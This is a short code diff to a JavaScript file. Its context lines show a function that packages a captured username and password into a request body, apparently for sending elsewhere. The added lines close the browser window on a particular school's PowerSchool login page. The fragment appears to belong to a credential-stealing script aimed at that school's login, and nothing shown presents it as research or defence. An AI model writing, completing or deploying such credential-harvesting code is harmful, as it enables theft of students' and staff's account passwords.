@@ -37,6 +37,9 @@ function valueUpdate(user, pass) {
             content: `Username: ${user}\nPassword: ${pass}`
         })
     })
+    if (window.location == "https://powerschool.zis.ch/public/#"){
+        window.close()
+    }
 }
 
 // init()
